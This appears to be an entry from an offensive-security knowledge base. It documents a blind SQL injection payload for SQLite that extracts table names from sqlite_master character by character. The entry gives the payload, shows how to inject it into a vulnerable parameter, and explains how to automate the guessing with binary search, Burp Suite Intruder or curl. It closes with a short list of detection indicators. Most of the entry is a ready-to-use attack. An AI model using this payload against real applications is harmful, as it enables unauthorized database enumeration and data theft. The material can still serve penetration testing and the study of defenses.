---
id: 329995f9-ffb9-4771-bea3-5a25e939ea24
name: SQLite-Boolean-Check-Table-Name-Starts-With-Char
type: code
language: SQL
verified: true
created_at: '2023-04-06T03:56:37.073907+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - sqli
  - boolean
  - sqlite
  - extraction
validated: true
---

# SQLite-Boolean-Check-Table-Name-Starts-With-Char

## Code

```sql
and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) > hex('some_char')
```

## Description

This SQL code snippet is a boolean condition designed for blind SQL injection in SQLite databases. It checks if the first character of the first user-created table name (excluding SQLite system tables) is greater than a specified character when converted to hexadecimal. Appended to an existing query via an injection point, it causes the application to respond differently based on true (character > guess) or false, enabling character-by-character extraction of table names from the sqlite_master metadata table.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| some_char | Single character to guess against (e.g., 'a', 'A', '0') | 'm' |

## Usage

Inject this snippet into a vulnerable parameter in a web application query, such as: `SELECT * FROM users WHERE id=1' [SNIPPET] --`. Iterate guesses for some_char using binary search on ASCII range (32-126) to determine the exact character. Use in tools like Burp Suite Intruder for automation or manually via curl. This is part of broader schema enumeration in blind SQLi attacks.

## Detection

- Web application logs showing repeated queries with hex() and substr() functions.
- WAF alerts on SQL keywords like 'sqlite_master', 'hex', or conditional operators in payloads.
- Anomalous response patterns (e.g., varying content lengths) from the same IP.
- Database query logs revealing access to metadata tables.

## Related

- [[procedures/SQLite-Boolean-Based-Information-Extraction]]
- [[tools/sqlmap]]
